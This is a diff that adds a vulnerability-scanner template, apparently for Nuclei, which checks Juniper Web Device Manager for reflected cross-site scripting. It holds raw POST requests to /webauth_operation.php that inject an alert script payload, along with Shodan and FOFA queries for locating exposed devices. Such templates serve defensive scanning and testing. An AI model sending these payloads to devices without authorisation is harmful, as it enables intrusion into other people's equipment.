@@ -1,0 +1,52 @@
+http:
+- matchers:
+  - condition: and
+    name: emit-debug-note-xss
+    type: word
+    words:
+    - 'ERROR: <script>alert(''document.domain'');</script>'
+    - monospace
+  - condition: and
+    name: sajax-show-one-stub-xss
+    type: word
+    words:
+    - <script>alert('document.domain');</script>
+    - wrapper for
+  matchers-condition: or
+  raw:
+  - 'POST /webauth_operation.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    rs=emit_debug_note&rsargs[]={{string}}&rsargs[]=<script>alert(''document.domain'');</script>
+
+    '
+  - 'POST /webauth_operation.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    rs=sajax_show_one_stub&rsargs[]={{string}}<script>alert(''document.domain'');</script>
+
+    '
+  stop-at-first-match: true
+id: junos-xss
+info:
+  author: DhiyaneshDK
+  metadata:
+    fofa-query: title="Juniper Web Device Manager"
+    max-request: 2
+    shodan-query: title:"Juniper Web Device Manager"
+    verified: true
+  name: JunOS - Cross-Site Scripting
+  reference:
+  - https://labs.watchtowr.com/the-second-wednesday-of-the-first-month-of-every-quarter-juniper-0day-revisited/
+  severity: medium
+  tags: junos,xss
+variables:
+  string: '{{to_lower(rand_base(2))}}'
